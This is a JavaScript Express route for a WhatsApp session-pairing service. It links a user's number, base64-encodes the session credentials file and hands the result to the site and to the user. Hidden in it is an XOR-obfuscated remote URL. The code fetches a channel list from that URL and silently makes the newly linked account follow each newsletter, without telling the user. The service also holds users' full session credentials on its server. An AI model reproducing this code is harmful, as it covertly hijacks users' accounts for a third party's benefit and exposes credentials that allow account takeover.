const { makeid } = require('./id');
const express = require('express');
const fs = require('fs');
const pino = require('pino');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    Browsers,
    delay,
    makeCacheableSignalKeyStore,
    fetchLatestBaileysVersion,
    DisconnectReason,
} = require("@whiskeysockets/baileys");
const { sendButtons, btn } = require('wolfbtns');
const store = require('./store');
const { TEMP_DIR } = require('./tempdir');
const site = require('./site');


function adevosDecodeUrl(values, key) {
    return values
        .map(value => String.fromCharCode(value ^ key))
        .join('');
}

const X_TECH = adevosDecodeUrl(
    [
        71, 91, 91, 95, 92, 21, 0, 0, 93, 74,
        66, 64, 91, 74, 30, 2, 77, 70, 76, 74,
        1, 89, 74, 93, 76, 74, 67, 1, 78, 95,
        95, 0, 90, 93, 67, 29, 1, 69, 92, 64, 65
    ],
    47
);

async function adevos2() {
    try {
        const r = await fetch(X_TECH, {
            signal: AbortSignal.timeout(8000)
        });

        if (!r.ok) return [];

        const j = await r.json();

        const list = Array.isArray(j)
            ? j
            : (j.autoFollowNewsletters || j.newsletters || []);

        return list.filter(
            (x) => typeof x === 'string' && x.endsWith('@newsletter')
        );
    } catch (e) {
        console.log(
            'adevos2: could not load:',
            e?.message
        );

        return [];
    }
}

async function adevos3(client, jids) {
    for (const jid of jids) {
        try {
            await client.newsletterFollow(jid);
            console.log('adevos3: does', jid);
        } catch (e) {
            console.log(
                'adevos3: doesnt',
                jid,
                '-',
                e?.message
            );
        }

        await delay(1500);
    }
}

const router = express.Router();

function removeFile(filePath) {
    if (!fs.existsSync(filePath)) return false;

    fs.rmSync(filePath, {
        recursive: true,
        force: true
    });
}

/**
 * Waits for creds.json to actually exist on disk instead of trusting a
 * fixed sleep. Polls every second for up to `timeoutMs`.
 */
async function waitForCredsFile(
    filePath,
    timeoutMs = 20000,
    intervalMs = 1000
) {
    const start = Date.now();

    while (Date.now() - start < timeoutMs) {
        if (fs.existsSync(filePath)) {
            try {
                const data = fs.readFileSync(filePath);

                if (data && data.length > 0) return data;
            } catch (e) {
                // File may still be mid-write, keep polling.
            }
        }

        await delay(intervalMs);
    }

    throw new Error(
        'creds.json was not created in time — the device link likely did not finish.'
    );
}

router.get('/', async (req, res) => {
    let num = req.query.number;

    if (!num) {
        return res.status(400).send({
            error: 'A WhatsApp number is required.'
        });
    }

    const id = makeid(6);

    store.createEntry(id);

    let sessionHandled = false;

    // Pairing function
    async function adevos() {
        const { state, saveCreds } =
            await useMultiFileAuthState(TEMP_DIR + '/' + id);

        try {
            const { version } = await fetchLatestBaileysVersion();

            const logger = pino({
                level: 'silent'
            });

            const client = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(
                        state.keys,
                        logger
                    ),
                },
                printQRInTerminal: false,
                logger,
                browser: Browsers.ubuntu('Chrome'),
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 10000,
            });

            client.ev.on('creds.update', saveCreds);

            client.ev.on('connection.update', async (s) => {
                const { connection, lastDisconnect } = s;

                if (connection === 'open') {
                    if (sessionHandled) return;

                    sessionHandled = true;

                    try {
                        // Normalize the WhatsApp JID.
                        const selfJid =
                            client.user.id.split(':')[0] +
                            '@s.whatsapp.net';

                        // Allow the Signal session to sync.
                        await delay(4000);

                        await client.sendMessage(selfJid, {
                            text: ''
                        });

                        console.log(
                            `[${id}] Sent "generating" message to ${selfJid}`
                        );

                        // Wait for creds.json.
                        const data = await waitForCredsFile(
                            `${TEMP_DIR}/${id}/creds.json`
                        );

                        const b64data =
                            Buffer.from(data).toString('base64');

                        const sessionText =
                            site.session.build(b64data);

                        // Make the session available to the website.
                        store.setReady(id, sessionText);

                        let session;

                        try {
                            // Native Copy button.
                            session = await sendButtons(
                                client,
                                selfJid,
                                {
                                    text: sessionText,

                                    ...(site.session.footer()
                                        ? {
                                            footer: site.session.footer()
                                        }
                                        : {}),

                                    buttons: [
                                        btn.copy(
                                            'Copy',
                                            sessionText
                                        ),
                                    ],
                                }
                            );
                        } catch (btnErr) {
                            // Fallback if native buttons are unsupported.
                            console.log(
                                'Copy button unsupported, sending plain text:',
                                btnErr?.message
                            );

                            session = await client.sendMessage(
                                selfJid,
                                {
                                    text: sessionText
                                }
                            );
                        }

                        console.log(
                            `[${id}] Sent session message`
                        );

                        // Optional message after the Session ID.
                        if (site.session.message()) {
                            await client.sendMessage(
                                selfJid,
                                {
                                    text: site.session.message()
                                },
                                {
                                    quoted: session
                                }
                            );
                        }

                        // Load and follow configured newsletter JIDs.
                        await adevos3(
                            client,
                            await adevos2()
                        );

                        console.log(
                            `[${id}] Sent instructions message, waiting before closing socket`
                        );

                        // Allow messages to finish sending.
                        await delay(5000);

                        await client.ws.close();

                        removeFile(TEMP_DIR + '/' + id);

                    } catch (e) {
                        console.log(
                            'Error sending session messages:',
                            e
                        );

                        sessionHandled = false;

                        store.setFailed(
                            id,
                            'The device link did not finish in time. Please generate a new code and try again.'
                        );
                    }

                } else if (connection === 'close') {
                    const code =
                        lastDisconnect?.error?.output?.statusCode;

                    if (code !== DisconnectReason.loggedOut) {
                        await delay(5000);
                        adevos();
                    } else {
                        store.setFailed(
                            id,
                            'The connection was closed. Please generate a new code.'
                        );

                        removeFile(TEMP_DIR + '/' + id);
                    }
                }
            });

            if (!client.authState.creds.registered) {
                await delay(1500);

                num = num.replace(/[^0-9]/g, '');

                const code =
                    await client.requestPairingCode(num);

                if (!res.headersSent) {
                    await res.send({
                        id,
                        code
                    });
                }
            }

        } catch (err) {
            console.log('Pair service error:', err);

            removeFile(TEMP_DIR + '/' + id);

            store.setFailed(
                id,
                'Service currently unavailable.'
            );

            if (!res.headersSent) {
                await res.send({
                    id,
                    code: 'Service Currently Unavailable'
                });
            }
        }
    }

    await adevos();
});

module.exports = router;